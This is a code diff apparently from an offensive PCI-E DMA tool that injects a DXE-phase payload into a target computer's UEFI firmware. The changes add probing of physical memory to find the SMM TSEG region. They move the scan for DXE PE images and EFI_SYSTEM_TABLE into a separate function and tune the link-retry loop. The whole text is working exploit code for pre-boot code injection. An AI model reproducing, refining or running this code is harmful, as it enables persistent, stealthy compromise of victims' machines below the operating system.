@@ -20,14 +20,17 @@ INFECTOR_CONFIG_SECTION = '.conf'
 INFECTOR_CONFIG_FMT = 'QQQ'
 INFECTOR_CONFIG_LEN = 8 + 8 + 8
 
-# how many seconds to sleep between device connect attempts
-RETRY_SLEEP = 2
-
 HEADER_SIZE = 0x400
 HEADER_MAGIC = 'MZ'
 
-SCAN_FROM = 0x7a000000
+SCAN_FROM = 0xf0000000
 SCAN_STEP = 0x20 * PAGE_SIZE
+
+# TSEG region location
+TSEG_FROM = 0x40000000
+TSEG_TO = 0xf0000000
+
+TSEG_MAX_SIZE = 0x800000
 
 def _infector_config_offset(pe):
         
@@ -78,7 +81,41 @@ def infector_get_image(payload_data, locate_protocol, system_table):
 
     return data, entry_rva, config_rva
 
-def find_sys_table(dev, addr):
+def find_tseg(dev):
+
+    addr = TSEG_TO
+
+    while addr > TSEG_FROM:
+
+        try:
+
+            ptr = 0
+
+            # do memory read attempt
+            dev.mem_read_4(addr)            
+
+            while ptr < 0x10000000:
+
+                try:
+
+                    # do memory read attempt
+                    dev.mem_read_4(addr + ptr)            
+
+                except dev.ErrorBadCompletion:
+
+                    return addr + ptr
+
+                ptr += TSEG_MAX_SIZE
+
+        except dev.ErrorBadCompletion:
+
+            pass
+
+        addr -= 0x10000000
+
+    return None
+
+def find_sys_table_from_image(dev, addr):
 
     import pefile
 
@@ -124,6 +161,37 @@ def find_sys_table(dev, addr):
 
     return None
 
+def find_sys_table(dev):
+
+    base, ptr = SCAN_FROM, 0
+
+    print('[+] Looking for DXE driver PE image...')
+
+    # try to find usable UEFI image at the middle of the first 4GB
+    while ptr < base:        
+
+        image = base - ptr
+        
+        try:
+
+            # check for DOS header
+            if dev.mem_read(image, 2) == HEADER_MAGIC:
+
+                print('[+] PE image is at 0x%x' % image)
+
+                g_st = find_sys_table_from_image(dev, image)
+                if g_st is not None:
+
+                    return g_st
+
+            ptr += SCAN_STEP
+
+        except dev.ErrorBadCompletion:            
+
+            ptr += TSEG_MAX_SIZE
+
+    raise(Exception('Unable to find EFI_SYSTEM_TABLE'))
+
 EFI_SYSTEM_TABLE_BootServices = 0x60
 EFI_BOOT_SERVICES_LocateProtocol = 0x140
 
@@ -136,12 +204,18 @@ def dxe_inject(payload = None, payload_data = None, system_table = None, status_
 
     if payload is not None:
 
+        print('[+] Reading DXE phase payload from %s' % payload)
+
         assert os.path.isfile(payload)
 
         with open(payload, 'rb') as fd:
 
             # read payload image
             payload_data = fd.read()
+
+    print('[+] Waiting for PCI-E link...')            
+
+    retry = 0
 
     while True:
 
@@ -163,20 +237,21 @@ def dxe_inject(payload = None, payload_data = None, system_table = None, status_
         except LinkLayer.ErrorNotReady as e: 
 
             # link not redy
-            print('[!] ' + str(e))
+            if retry % 20 == 0: print('[!] ' + str(e))
 
         except LinkLayer.ErrorTimeout as e:
 
             # TLP reply timeout
-            print('[!] ' + str(e))
+            if retry % 20 == 0: print('[!] ' + str(e))
 
         except TransactionLayer.ErrorBadCompletion as e: 
 
             # bad MRd TLP completion received
-            print('[!] ' + str(e))        
+            if retry % 20 == 0: print('[!] ' + str(e))        
 
         # system is not ready yet
-        time.sleep(RETRY_SLEEP)
+        retry += 1
+        time.sleep(0.1)
     
     print('[+] PCI-E link with target is up')
 
@@ -184,29 +259,11 @@ def dxe_inject(payload = None, payload_data = None, system_table = None, status_
 
     if g_st is None:
 
-        base, ptr = SCAN_FROM, 0
+        # get EFI_SYSTEM_TABLE address
+        g_st = find_sys_table(dev)
 
-        print('[+] Looking for DXE driver PE image...')
+        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
 
-        # try to find usable UEFI image at the middle of the first 4GB
-        while ptr < base:
-
-            image = base - ptr
-            
-            # check for DOS header
-            if dev.mem_read(image, 2) == HEADER_MAGIC:
-
-                print('[+] PE image is at 0x%x' % image)
-
-                g_st = find_sys_table(dev, image)
-                if g_st is not None:
-
-                    print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
-                    break
-
-            ptr += SCAN_STEP
-
-    assert g_st is not None
     assert valid_dxe_addr(g_st)
 
     # get EFI_BOOT_SERVICES address
